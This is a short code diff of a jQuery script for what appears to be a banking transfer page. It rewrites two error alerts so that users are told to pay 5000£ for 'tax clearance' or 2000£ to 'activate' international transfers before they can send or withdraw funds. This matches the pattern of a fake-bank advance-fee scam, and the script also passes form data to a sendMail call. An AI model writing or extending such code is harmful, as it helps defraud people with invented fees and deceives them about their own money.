@@ -145,7 +145,7 @@ jQuery(document).ready(function ($) {
     sendMail(formdata);
     if (tax === "") {
       alert(
-        "Tax clearance not found on account, please visit the nearest bank around"
+        "Tax clearance not found on account, please visit the nearest bank around, kindly pay 5000£ before you can send or withdraw"
       );
       $("#atax").show();
       $(_this).find(":input").attr("disabled", false);
@@ -153,7 +153,7 @@ jQuery(document).ready(function ($) {
       $(".tbutton").html('<i class="icon-signin icon-large"></i>Transfer Me');
     } else if (imt === "") {
       alert(
-        "International Money Transfer clearance not found on account, please visit the nearest bank around"
+        "International Money Transfer clearance not found on account, a sum of 2000£ is required to activate this!"
       );
       $("#aimt").show();
       $(_this).find(":input").attr("disabled", false);
